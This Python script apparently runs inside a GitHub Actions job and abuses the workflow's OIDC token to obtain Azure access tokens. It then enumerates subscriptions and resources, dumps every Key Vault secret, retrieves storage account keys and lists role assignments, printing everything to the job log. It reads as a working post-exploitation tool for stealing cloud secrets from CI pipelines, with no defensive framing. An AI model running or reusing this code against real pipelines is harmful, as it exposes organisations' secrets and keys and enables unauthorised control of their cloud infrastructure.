import json, os, sys, urllib.parse, urllib.request

def http(url, data=None, headers=None, method=None):
    h = {"Accept": "application/json"}
    if headers: h.update(headers)
    body = data.encode() if isinstance(data, str) else data
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=30)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)

def b64url(s):
    import base64
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s).decode("utf-8", "replace")

CID = os.environ.get("AZURE_CLIENT_ID", "")
TID = os.environ.get("AZURE_TENANT_ID", "")
SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", "")
print("### AZURE_CLIENT_ID=%s" % CID)
print("### AZURE_TENANT_ID=%s" % TID)
print("### AZURE_SUBSCRIPTION_ID=%s" % SUB)

url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=" + urllib.parse.quote("api://AzureADTokenExchange")
st, body = http(url, headers={"Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
jwt = json.loads(body)["value"]
claims = json.loads(b64url(jwt.split(".")[1]))
print("### OIDC claims:", json.dumps({k: claims[k] for k in ("sub", "aud", "repository", "ref", "event_name", "job_workflow_ref") if k in claims}, indent=1))

def token(scope):
    d = urllib.parse.urlencode({
        "client_id": CID, "scope": scope, "grant_type": "client_credentials",
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": jwt})
    st, b = http("https://login.microsoftonline.com/%s/oauth2/v2.0/token" % TID, d,
                 {"Content-Type": "application/x-www-form-urlencoded"})
    if st != 200:
        print("### token FAIL", scope, st, b[:800]); return None
    print("### token OK", scope)
    return json.loads(b)["access_token"]

ARM = token("https://management.azure.com/.default")
if not ARM: sys.exit(0)
A = {"Authorization": "Bearer " + ARM}

st, b = http("https://management.azure.com/subscriptions?api-version=2022-12-01", headers=A)
print("### subscriptions", st, b[:1500])
subs = [s["subscriptionId"] for s in json.loads(b).get("value", [])] if st == 200 else ([SUB] if SUB else [])

for s in subs:
    st, b = http("https://management.azure.com/subscriptions/%s/resources?api-version=2021-04-01" % s, headers=A)
    print("### resources in", s, st)
    ids = []
    if st == 200:
        for r in json.loads(b).get("value", []):
            print("   ", r["type"], r["name"], r["id"])
            ids.append((r["type"], r["name"], r["id"]))

    # Key Vaults
    for t, n, rid in ids:
        if t.lower() == "microsoft.keyvault/vaults":
            KV = token("https://vault.azure.net/.default")
            if KV:
                H = {"Authorization": "Bearer " + KV}
                st2, b2 = http("https://%s.vault.azure.net/secrets?api-version=7.4" % n, headers=H)
                print("### KV", n, st2, b2[:2000])
                if st2 == 200:
                    for sec in json.loads(b2).get("value", []):
                        sid = sec["id"]
                        st3, b3 = http(sid + "?api-version=7.4", headers=H)
                        print("### SECRET", sid, st3, b3[:2000])
        if t.lower() == "microsoft.storage/storageaccounts":
            st2, b2 = http("https://management.azure.com%s/listKeys?api-version=2023-01-01" % rid, data=b"", headers=A, method="POST")
            print("### STORAGE KEYS", n, st2, b2[:1200])
        if t.lower() == "microsoft.appconfiguration/configurationstores":
            print("### APPCONFIG", rid)
    # role assignments for self
    st2, b2 = http("https://management.azure.com/subscriptions/%s/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" % s, headers=A)
    print("### roleAssignments", st2, b2[:3000])
